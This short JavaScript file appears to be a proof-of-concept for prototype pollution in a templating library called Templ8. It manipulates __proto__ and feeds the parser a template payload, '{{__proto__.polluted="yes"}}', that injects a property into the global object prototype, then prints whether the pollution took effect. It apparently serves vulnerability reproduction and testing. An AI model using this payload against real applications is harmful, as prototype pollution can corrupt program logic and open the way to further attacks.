var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const Templ8 = require('Templ8');
const tpl = new Templ8('{{__proto__.polluted="yes"}}');
tpl.parse();
try {
    console.log('{ ' + polluted + ', ' + 'yes' + ' }');
} catch {
    console.log('{ ' + false + ', ' + true + ' }');
}